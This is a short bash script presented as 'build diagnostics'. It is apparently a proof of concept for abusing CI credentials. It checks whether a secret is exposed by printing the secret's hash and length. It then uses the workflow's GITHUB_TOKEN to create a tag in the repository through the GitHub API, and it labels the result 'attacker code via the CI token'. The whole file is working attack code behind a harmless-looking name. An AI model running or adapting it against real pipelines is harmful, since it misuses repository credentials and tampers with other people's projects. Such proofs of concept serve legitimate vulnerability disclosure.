#!/usr/bin/env bash
set -uo pipefail
echo "== build diagnostics =="
if [ -n "${FAKE_SECRET:-}" ]; then
  echo "SECRET REACHABLE: sha256=$(printf %s "$FAKE_SECRET" | sha256sum | cut -d' ' -f1) len=${#FAKE_SECRET}"
fi
API="${GITHUB_API_URL:-https://api.github.com}"
TAG="f22-ci-token-proof-$(date +%s)"
HTTP=$(curl -s -o /tmp/r.json -w '%{http_code}' -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  "$API/repos/$GITHUB_REPOSITORY/git/refs" \
  -d "{\"ref\":\"refs/tags/$TAG\",\"sha\":\"$GITHUB_SHA\"}")
if [ "$HTTP" = "201" ]; then
  echo "RESULT: WRITE CONFIRMED -- tag $TAG created by attacker code via the CI token"
else
  echo "RESULT: write not granted (http $HTTP)"; cat /tmp/r.json
fi
